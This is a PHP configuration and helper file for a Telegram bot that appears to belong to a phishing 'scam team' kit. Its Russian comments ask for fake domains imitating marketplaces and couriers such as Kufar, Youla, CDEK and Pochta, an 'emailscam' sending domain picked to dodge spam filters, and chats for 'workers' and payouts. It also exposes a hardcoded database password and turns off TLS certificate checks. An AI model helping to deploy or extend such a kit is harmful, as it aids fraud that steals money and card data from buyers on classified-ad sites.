<?php
#По всем вопросам обращаться в Telegram: @Google1Shop


#Тут вводите все свои домены
$domains = Array(
    'kufar2' => 'kufar.de',
    'youla' => '',
    'boxberry' => '',
    'cdek' => '',
    'pec' => '',
    'pochta' => '',
    'kufar' => 'kufar.de'
);

$settingsarr["nick"] = "@hrz14rv"; #Вводите суда свой никнейм.
$settingsarr["bot"] = "@projmnky_bot"; #Вводите суда никнейм вашего бота
$settingsarr["workers"] = "https://t.me/projmnky"; #Вводите суда ссылку на чат воркеров.
$settingsarr["good"] = "https://t.me/projmnkyinfo"; #Вводите суда ссылку на канал выплат.
$settingsarr["emailscam"] = "kufar.de"; #Вводите суда домен с которого будет отправка, чтобы не шло в спам письмо. 

#Тут вводите данные от вашей БД
define('MYSQL_HOST', 'localhost');
define('MYSQL_USER', 'proj1');
define('MYSQL_PASS', '098098098ererer!');
define('MYSQL_BASE', 'user1207376_proj1');

#ДАЛЬШЕ НАСТРАИВАТЬ НИЧЕГО НЕ НУЖНО
ob_start();

ini_set('error_reporting', E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

if (!function_exists('curl_get_contents')) {
    function curl_get_contents($url)
    {
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
        $data = curl_exec($curl);
        curl_close($curl);
        return $data;
    }
}



if (!function_exists('Endings')) {
    function Endings($string, $ch1, $ch2, $ch3)
    {
        $ff = Array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');
        if (substr($string, -2, 1) == 1 AND strlen($string) > 1) $ry = Array("0 $ch3", "1 $ch3", "2 $ch3", "3 $ch3", "4 $ch3", "5 $ch3", "6 $ch3", "7 $ch3", "8 $ch3", "9 $ch3");
        else $ry = Array("0 $ch3", "1 $ch1", "2 $ch2", "3 $ch2", "4 $ch2", "5 $ch3", "6 $ch3", "7 $ch3", "8 $ch3", "9 $ch3");
        $string1 = substr($string, 0, -1) . str_replace($ff, $ry, substr($string, -1, 1));
        return $string1;
    }
}

if (!function_exists('get_string_between')) {
    function get_string_between($string, $start, $end)
    {
        $string = ' ' . $string;
        $ini = strpos($string, $start);
        if ($ini == 0) return '';
        $ini += strlen($start);
        $len = strpos($string, $end, $ini) - $ini;
        return substr($string, $ini, $len);
    }
}


$connection = mysqli_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASS) or die ('Не удалось подключиться к серверу MySQL: ' . mysql_error());
$database = mysqli_select_db($connection, MYSQL_BASE) or die ('Не удалось соединиться с базой данных: ' . mysql_error());
mysqli_query($connection, "SET NAMES utf8");

if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
}

$settings = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `config`"));

$config = Array(
    'token' => $settings['token'],
    'chat' => Array(
        'admin' => $settings['alerts'],
        'workers' => $settings['workers'],
        'moders' => $settings['moders'],
        'payments' => $settings['payments'],
        'supports' => $settings['supports'],
    ),

    'invites' => Array(
        'workers' => $settingsarr["workers"],
        'payments' => $settingsarr["good"],
        'goods' => $settingsarr["good"]
    )
);

$data = json_decode(file_get_contents('php://input'));

if (isset($data)) {
    $message = Array(
        'chat_id' => $data->{'message'}->{'chat'}->{'id'},
        'message_id' => $data->{'message'}->{'message_id'},
        'text' => $data->{'message'}->{'text'},
        'from' => $data->{'message'}->{'from'}->{'id'},
        'username' => $data->{'message'}->{'from'}->{'username'},
        'firstname' => $data->{'message'}->{'from'}->{'first_name'},
        'lastname' => $data->{'message'}->{'from'}->{'last_name'},
        'new_chat_member' => $data->{'message'}->{'new_chat_member'},
        'left_chat_member' => $data->{'message'}->{'left_chat_member'}
    );

    $callback = Array(
        'id' => $data->{'callback_query'}->{'id'},
        'type' => $data->{'callback_query'}->{'data'},
        'chat_id' => $data->{'callback_query'}->{'message'}->{'chat'}->{'id'},
        'from' => $data->{'callback_query'}->{'from'}->{'id'},
        'username' => $data->{'callback_query'}->{'from'}->{'username'},
        'firstname' => $data->{'callback_query'}->{'from'}->{'first_name'},
        'lastname' => $data->{'callback_query'}->{'from'}->{'last_name'},
        'message_id' => $data->{'callback_query'}->{'message'}->{'message_id'},
        'message_text' => $data->{'callback_query'}->{'message'}->{'text'}
    );
}

if (!function_exists('getCountryFlag')) {
    function getCountryFlag($country)
    {
        $flags = Array(
            'AF' => '🇦🇫',
            'AX' => '🇦🇽',
            'AL' => '🇦🇱',
            'DZ' => '🇩🇿',
            'AS' => '🇦🇸',
            'AD' => '🇦🇩',
            'AO' => '🇦🇴',
            'AI' => '🇦🇮',
            'AQ' => '🇦🇶',
            'AG' => '🇦🇬',
            'AR' => '🇦🇷',
            'AM' => '🇦🇲',
            'AW' => '🇦🇼',
            'AU' => '🇦🇺',
            'AT' => '🇦🇹',
            'AZ' => '🇦🇿',
            'BS' => '🇧🇸',
            'BH' => '🇧🇭',
            'BD' => '🇧🇩',
            'BB' => '🇧🇧',
            'BY' => '🇧🇾',
            'BE' => '🇧🇪',
            'BZ' => '🇧🇿',
            'BJ' => '🇧🇯',
            'BM' => '🇧🇲',
            'BT' => '🇧🇹',
            'BO' => '🇧🇴',
            'BA' => '🇧🇦',
            'BW' => '🇧🇼',
            'BR' => '🇧🇷',
            'IO' => '🇮🇴',
            'VG' => '🇻🇬',
            'BN' => 'BN',
            'BG' => '🇧🇬',
            'BF' => '🇧🇫',
            'BI' => '🇧🇮',
            'KH' => '🇰🇭',
            'CM' => '🇨🇲',
            'CA' => '🇨🇦',
            'IC' => '🇮🇨',
            'CV' => '🇨🇻',
            'BQ' => '🇧🇶',
            'KY' => '🇰🇾',
            'CF' => '🇨🇫',
            'TD' => '🇹🇩',
            'CL' => '🇨🇱',
            'CN' => '🇨🇳',
            'CX' => '🇨🇽',
            'CC' => '🇨🇨',
            'CO' => '🇨🇴',
            'KM' => '🇰🇲',
            'CG' => '🇨🇬',
            'CD' => '🇨🇩',
            'CK' => '🇨🇰',
            'CR' => '🇨🇷',
            'CI' => '🇨🇮',
            'HR' => '🇭🇷',
            'CU' => '🇨🇺',
            'CW' => '🇨🇼',
            'CY' => '🇨🇾',
            'CZ' => '🇨🇿',
            'DK' => '🇩🇰',
            'DJ' => '🇩🇯',
            'DM' => '🇩🇲',
            'DO' => '🇩🇴',
            'EC' => '🇪🇨',
            'EG' => '🇪🇬',
            'SV' => '🇸🇻',
            'GQ' => '🇬🇶',
            'ER' => '🇪🇷',
            'EE' => '🇪🇪',
            'ET' => '🇪🇹',
            'EU' => '🇪🇺',
            'FK' => '🇫🇰',
            'FO' => '🇫🇴',
            'FJ' => '🇫🇯',
            'FI' => '🇫🇮',
            'FR' => '🇫🇷',
            'GF' => '🇬🇫',
            'PF' => '🇵🇫',
            'TF' => '🇹🇫',
            'GA' => '🇬🇦',
            'GM' => '🇬🇲',
            'GE' => '🇬🇪',
            'DE' => '🇩🇪',
            'GH' => '🇬🇭',
            'GI' => '🇬🇮',
            'GR' => '🇬🇷',
            'GL' => '🇬🇱',
            'GD' => '🇬🇩',
            'GP' => '🇬🇵',
            'GU' => '🇬🇺',
            'GT' => '🇬🇹',
            'GG' => '🇬🇬',
            'GN' => '🇬🇳',
            'GW' => '🇬🇼',
            'GY' => '🇬🇾',
            'HT' => '🇭🇹',
            'HN' => '🇭🇳',
            'HK' => '🇭🇰',
            'HU' => '🇭🇺',
            'IS' => '🇮🇸',
            'IN' => '🇮🇳',
            'ID' => '🇮🇩',
            'IR' => '🇮🇷',
            'IQ' => '🇮🇶',
            'IE' => '🇮🇪',
            'IM' => '🇮🇲',
            'IL' => '🇮🇱',
            'IT' => '🇮🇹',
            'JM' => '🇯🇲',
            'JP' => '🇯🇵',
            'JE' => '🇯🇪',
            'JO' => '🇯🇴',
            'KZ' => '🇰🇿',
            'KE' => '🇰🇪',
            'KI' => '🇰🇮',
            'XK' => '🇽🇰',
            'KW' => '🇰🇼',
            'KG' => '🇰🇬',
            'LA' => '🇱🇦',
            'LV' => '🇱🇻',
            'LB' => '🇱🇧',
            'LS' => '🇱🇸',
            'LR' => '🇱🇷',
            'LY' => '🇱🇾',
            'LI' => '🇱🇮',
            'LT' => '🇱🇹',
            'LU' => '🇱🇺',
            'MO' => '🇲🇴',
            'MK' => '🇲🇰',
            'MG' => '🇲🇬',
            'MW' => '🇲🇼',
            'MY' => '🇲🇾',
            'MV' => '🇲🇻',
            'ML' => '🇲🇱',
            'MT' => '🇲🇹',
            'MH' => '🇲🇭',
            'MQ' => '🇲🇶',
            'MR' => '🇲🇷',
            'MU' => '🇲🇺',
            'YT' => '🇾🇹',
            'MX' => '🇲🇽',
            'FM' => '🇫🇲',
            'MD' => '🇲🇩',
            'MC' => '🇲🇨',
            'MN' => '🇲🇳',
            'ME' => '🇲🇪',
            'MS' => '🇲🇸',
            'MA' => '🇲🇦',
            'MZ' => '🇲🇿',
            'MM' => '🇲🇲',
            'NA' => '🇳🇦',
            'NR' => '🇳🇷',
            'NP' => '🇳🇵',
            'NL' => '🇳🇱',
            'NC' => '🇳🇨',
            'NZ' => '🇳🇿',
            'NI' => '🇳🇮',
            'NE' => '🇳🇪',
            'NG' => '🇳🇬',
            'NU' => '🇳🇺',
            'NF' => '🇳🇫',
            'KP' => '🇰🇵',
            'MP' => '🇲🇵',
            'NO' => '🇳🇴',
            'OM' => '🇴🇲',
            'PK' => '🇵🇰',
            'PW' => '🇵🇼',
            'PS' => '🇵🇸',
            'PA' => '🇵🇦',
            'PG' => '🇵🇬',
            'PY' => '🇵🇾',
            'QA' => '🇶🇦',
            'RE' => '🇷🇪',
            'RO' => '🇷🇴',
            'RU' => '🇷🇺',
            'RW' => '🇷🇼',
            'WS' => '🇼🇸',
            'SM' => '🇸🇲',
            'ST' => '🇸🇹',
            'SA' => '🇸🇦',
            'SN' => '🇸🇳',
            'RS' => '🇷🇸',
            'SC' => '🇸🇨',
            'SL' => '🇸🇱',
            'SG' => '🇸🇬',
            'SX' => '🇸🇽',
            'SK' => '🇸🇰',
            'SI' => '🇸🇮',
            'GS' => '🇬🇸',
            'SB' => '🇸🇧',
            'SO' => '🇸🇴',
            'ZA' => '🇿🇦',
            'KR' => '🇰🇷',
            'SS' => '🇸🇸',
            'ES' => '🇪🇸',
            'LK' => '🇱🇰',
            'BL' => '🇧🇱',
            'SH' => '🇸🇭',
            'KN' => '🇰🇳',
            'LC' => '🇱🇨',
            'PM' => '🇵🇲',
            'VC' => '🇻🇨',
            'SD' => '🇸🇩',
            'SR' => '🇸🇷',
            'SZ' => '🇸🇿',
            'SE' => '🇸🇪',
            'CH' => '🇨🇭',
            'SY' => '🇸🇾',
            'TW' => '🇹🇼',
            'TJ' => '🇹🇯',
            'TZ' => '🇹🇿',
            'TH' => '🇹🇭',
            'TL' => '🇹🇱',
            'TG' => '🇹🇬',
            'TK' => '🇹🇰',
            'TO' => '🇹🇴',
            'TT' => '🇹🇹',
            'TN' => '🇹🇳',
            'TR' => '🇹🇷',
            'TM' => '🇹🇲',
            'TC' => '🇹🇨',
            'TV' => '🇹🇻',
            'VI' => '🇻🇮',
            'UG' => '🇺🇬',
            'UA' => '🇺🇦',
            'AE' => '🇦🇪',
            'GB' => '🇬🇧',
            'US' => '🇺🇸',
            'UY' => '🇺🇾',
            'UZ' => '🇺🇿',
            'VU' => '🇻🇺',
            'VA' => '🇻🇦',
            'VE' => '🇻🇪',
            'VN' => '🇻🇳',
            'WF' => '🇼🇫',
            'EH' => '🇪🇭',
            'YE' => '🇾🇪',
            'ZM' => '🇿🇲',
            'ZW' => '🇿🇼'
        );

        if (isset($flags[$country])) {
            return $flags[$country];
        }
    }
}

if (!function_exists('send')) {
    function send($token, $method, $params = Array())
    {
        $url = "https://api.telegram.org/bot$token/$method?" . http_build_query($params);
        if(strpos($url, $config['token']) !== false) {
            return false;
        }
        return json_decode(curl_get_contents($url));
    }
}

?>